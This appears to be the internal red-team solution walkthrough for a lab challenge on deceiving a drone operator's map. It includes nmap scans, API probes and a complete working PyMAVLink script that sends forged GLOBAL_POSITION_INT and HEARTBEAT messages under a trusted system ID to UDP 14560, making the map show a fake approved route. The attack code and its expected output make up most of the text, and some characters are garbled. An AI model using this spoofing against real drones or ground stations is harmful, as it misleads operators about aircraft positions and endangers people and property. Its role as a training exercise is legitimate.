# MAVLink Inspection Drone GPS Telemetry Deception

> This walkthrough shows the internal manual red-team solution path. Do not use attack.yml or any provided helper script for the red solution.

## Objective

> Manipulate the operator map so it displays a safe approved route while the truth simulator continues moving on a different route.
>
> This challenge uses real MAVLink messages through PyMAVLink. The participant must discover the services, identify the telemetry path, and send valid MAVLink GLOBAL_POSITION_INT messages manually.

## 1. Set the Target

> If solving from the same lab VM:

î°ƒexport TARGET=127.0.0.1

> î°‚If solving from another host, use the VM IP:

î°ƒexport TARGET=\<target-ip\>

> î°‚Confirm:

î°ƒecho "\$TARGET"

## î°‚2. Discover Exposed Services

> Start with a TCP scan.

î°ƒnmap -sT -Pn -p- --min-rate 2000 "\$TARGET"

î°‚<img src="https://raw.githubusercontent.com/hacktify-uv/temp/main/MAVLink-Inspection-Drone-GPS-Telemetry-Deception-Red/media/image3.png" style="width:6.5in;height:2.27778in" />

> Expected important finding:

î°ƒ8088/tcp open

> î°‚Open the discovered web service.

î°ƒcurl -s "http://\$TARGET:8088/" \| head

î°‚

> You should identify an operator-facing inspection drone map.

## 3. Inspect the Operator Map APIs

> Check the current displayed position.

î°ƒcurl -s "http://\$TARGET:8088/api/display"

> î°‚Useful fields:
>
> <img src="https://raw.githubusercontent.com/hacktify-uv/temp/main/MAVLink-Inspection-Drone-GPS-Telemetry-Deception-Red/media/image1.png" style="width:6.5in;height:3.81944in" />

î°ƒvehicle

telemetry

expected_sysid

expected_compid

lat

lon

last_src

> î°‚In this lab, the accepted MAVLink identity is:

î°ƒSystem ID: 42

Component ID: 1

> î°‚Check whether the approved route is exposed.

î°ƒcurl -s "http://\$TARGET:8088/robots.txt"

curl -s "http://\$TARGET:8088/api/route"

> î°‚<img src="https://raw.githubusercontent.com/hacktify-uv/temp/main/MAVLink-Inspection-Drone-GPS-Telemetry-Deception-Red/media/image6.png" style="width:6.01042in;height:2.58333in" />

<img src="https://raw.githubusercontent.com/hacktify-uv/temp/main/MAVLink-Inspection-Drone-GPS-Telemetry-Deception-Red/media/image4.png" style="width:6.5in;height:5.41667in" />

> The route endpoint gives the safe-looking route that the operator expects to see.

## 4. Discover MAVLink Telemetry Ingress

> MAVLink commonly uses UDP ports in the 14540-14560 range.
>
> Scan likely UDP ports.

î°ƒsudo nmap -sU -Pn -p 14540-14580 "\$TARGET"

> î°‚<img src="https://raw.githubusercontent.com/hacktify-uv/temp/main/MAVLink-Inspection-Drone-GPS-Telemetry-Deception-Red/media/image2.png" style="width:5.98958in;height:2.5625in" />
>
> In this lab, the operator map receives MAVLink telemetry on:

î°ƒUDP 14560

> î°‚If UDP scan results are unclear, actively test the likely MAVLink ports and observe whether /api/display changes.

## 5. Understand the Weakness

> The operator map trusts MAVLink telemetry by sysid and compid.
>
> It accepts the latest GLOBAL_POSITION_INT message for:

î°ƒsysid: 42

compid: 1

> î°‚It does not authenticate the sender IP or validate that the message came from the genuine proxy.
>
> This allows a rogue sender to transmit valid MAVLink position messages that overwrite the displayed position.

## 6. Send Manual MAVLink Spoofed GPS Telemetry

> Use the approved route from /api/route and send valid MAVLink GLOBAL_POSITION_INT messages faster than the genuine stream.
>
> This is not a provided helper script. It is a manual inline sender created during the solve.

î°ƒexport TARGET=127.0.0.1

export SRC=127.0.0.77

export PORT=14560

export SYSID=42

export COMPID=1

/opt/mavlink-drone/venv/bin/python - \<\<'PY'

import os

import socket

import time

from pymavlink.dialects.v20 import common as mavlink2

target = os.environ.get("TARGET", "127.0.0.1")

src = os.environ.get("SRC", "127.0.0.77")

port = int(os.environ.get("PORT", "14560"))

sysid = int(os.environ.get("SYSID", "42"))

compid = int(os.environ.get("COMPID", "1"))

approved_route = \[

(19.076000, 72.877700, 120),

(19.076450, 72.878200, 120),

(19.076900, 72.878700, 120),

(19.077350, 72.879200, 120),

(19.077800, 72.879700, 120),

(19.078250, 72.880200, 120),

(19.078700, 72.880700, 120),

\]

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

sock.bind((src, 0))

mav = mavlink2.MAVLink(None)

mav.srcSystem = sysid

mav.srcComponent = compid

boot = time.monotonic()

for i in range(120):

if i % 20 == 0:

hb = mav.heartbeat_encode(

mavlink2.MAV_TYPE_QUADROTOR,

mavlink2.MAV_AUTOPILOT_GENERIC,

0,

0,

mavlink2.MAV_STATE_ACTIVE

)

sock.sendto(hb.pack(mav), (target, port))

lat, lon, alt = approved_route\[i % len(approved_route)\]

msg = mav.global_position_int_encode(

int((time.monotonic() - boot) \* 1000) & 0xFFFFFFFF,

int(lat \* 1e7),

int(lon \* 1e7),

int(alt \* 1000),

int(alt \* 1000),

0,

0,

0,

0

)

sock.sendto(msg.pack(mav), (target, port))

time.sleep(0.2)

print(f"sent spoofed MAVLink GLOBAL_POSITION_INT stream src={src} dst={target}:{port} sysid={sysid} compid={compid}")

PY

> î°‚This sends a false safe route at approximately 5 messages per second.
>
> The genuine truth stream is slower, so the operator map follows the spoofed approved route most of the time.
>
> <img src="https://raw.githubusercontent.com/hacktify-uv/temp/main/MAVLink-Inspection-Drone-GPS-Telemetry-Deception-Red/media/image5.png" style="width:6.5in;height:5.63889in" />

## 7. Validate the Operator View

> While the sender is running, query the displayed map state.

î°ƒwatch -n 1 'curl -s http://127.0.0.1:8088/api/display'

> î°‚Expected observation:

î°ƒlast_src: 127.0.0.77

lat/lon follow the approved route

accepted: true

> î°‚The truth simulator remains unchanged because the attack only manipulates the operator's telemetry view.

## 8. Red Answer

> Submit:

î°ƒProtocol: MAVLink

Manipulated view: Operator map GPS telemetry

Targeted telemetry ingress: UDP 14560

Message type used: GLOBAL_POSITION_INT

Supporting message: HEARTBEAT

Accepted identity: sysid 42, compid 1

Rogue sender: 127.0.0.77

Technique: Sent higher-rate false GLOBAL_POSITION_INT messages following the approved route

Impact: Operator map displayed the approved route while the independent truth simulator continued elsewhere

## î°‚Success Criteria

> The red objective is complete when:

î°ƒ1. The operator map service is discovered.

2\. The MAVLink telemetry ingress is identified.

3\. Valid MAVLink GPS position messages are sent manually.

4\. The displayed map position follows the false approved route.

5\. The truth generator is not modified.

î°‚

